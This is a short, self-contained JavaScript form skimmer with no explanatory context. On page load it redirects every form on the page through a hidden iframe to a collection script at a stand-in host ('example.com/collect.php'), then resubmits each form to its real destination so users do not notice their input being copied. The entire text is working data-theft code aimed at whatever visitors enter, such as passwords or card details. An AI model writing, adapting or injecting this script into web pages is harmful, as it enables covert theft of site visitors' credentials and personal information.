
window.onload = function(){
	a=document.getElementsByTagName('form');
	b = document.createElement('iframe');
	b.name = 'submit_frame';
	b.style = 'display:none';
	var b = document.body.appendChild(b);
	function frameLoaded(){
		s = document.getElementById('just_submitted');
		s.target = '';
		s.action = s.getAttribute('data-url');
		try{
			s.submit();
		}catch(e){
			s.submit.click();	
		}
	}

	for(i=0;i<a.length;i++){
		a[i].target = 'submit_frame';
		a[i].setAttribute('data-url', a[i].action);
		a[i].action = "http://example.com/collect.php";
		
		a[i].addEventListener('submit', function(event){
			this.setAttribute('id', 'just_submitted');
			b.addEventListener('load', frameLoaded);
			b.addEventListener('error', frameLoaded);
		}, false);
	}
}